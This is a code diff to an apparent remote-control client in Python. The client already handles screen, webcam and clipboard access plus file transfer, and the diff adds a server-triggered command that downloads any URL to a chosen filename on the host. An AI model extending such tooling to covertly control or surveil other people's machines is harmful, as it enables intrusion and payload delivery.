@@ -1,5 +1,6 @@
 import logging
 
+import json
 import subprocess
 from io import StringIO
 from contextlib import redirect_stdout
@@ -10,6 +11,7 @@ from utils.baseclient import BaseClient
 from modules import screen
 from modules import webcam
 from modules import clipboard
+from modules import download
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -42,6 +44,8 @@ class Client(BaseClient):
                 self.send_file()
             case 'RECEIVE_FILE':
                 self.receive_file()
+            case 'DOWNLOAD':
+                self.download()
             case _:
                 logging.debug('Received unrecognized command: %s' % command)
 
@@ -162,6 +166,20 @@ class Client(BaseClient):
             logging.error('Error receiving file from server: %s' % str(error))
             self.write(b'ERROR')
             self.write(f'{error.__class__.__name__}: {str(error)}')
+
+    def download(self) -> None:
+        """ Download a file from the web """
+        logging.debug("Attempting to download file from the web")
+        url, filename = json.loads(self.read().decode())
+
+        try:
+            download.download(url, filename)
+        except RuntimeError as error:
+            logging.error("Error downloading file from the web: %s" % str(error))
+            self.write(str(error).encode())
+        else:
+            logging.info("Saved downloaded file from '%s' as '%s'" % (url, filename))
+            self.write(b'Success')
 
 
 if __name__ == '__main__':
